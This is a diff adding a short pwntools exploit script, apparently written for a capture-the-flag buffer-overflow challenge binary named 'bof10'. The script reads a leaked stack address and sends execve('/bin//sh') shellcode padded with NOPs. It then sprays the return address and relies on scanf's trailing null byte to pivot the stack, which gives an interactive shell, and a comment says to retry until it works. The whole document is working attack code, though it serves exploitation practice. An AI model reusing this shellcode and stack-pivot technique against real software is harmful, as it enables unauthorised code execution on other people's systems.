@@ -1,0 +1,34 @@
+from pwn import *
+
+# scanf func auto add a b'\x00' at the end of buf, can use to overwrite
+
+p = process("./bof10")
+
+'''
+p = gdb.debug("./bof10", gdbscript = 
+b *play_game + 136
+)
+'''
+
+p.sendlineafter(b"Your name: ", b"vani5hing")
+p.recvuntil(b"for you: ")
+stack_addr = int(p.recvline(), 16)
+
+shellcode = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
+rbp_func = stack_addr - 0x10
+rsp_func = rbp_func - 0x200
+
+# its work only when
+# rsp_func <= rbp_fake <= rbp_func
+# stack_addr - 0x210 = rbp - 0x50 - 0x210 <= rbp_fake = rbp - (rbp & 0xff) <= rbp - 0x60
+# rbp - 0x260 <= rbp - (rbp & 0xff) <= rbp - 0x60
+# only when (rbp & 0xff) >= 0x60 and stack allign 
+# spam until it works
+
+payload = shellcode.ljust(24, b'\x90')
+payload += p64(rsp_func) * (512 - len(payload) // 8)
+p.sendafter(b"Say something: ", payload)
+p.recv()
+print(hex(stack_addr))
+
+p.interactive()
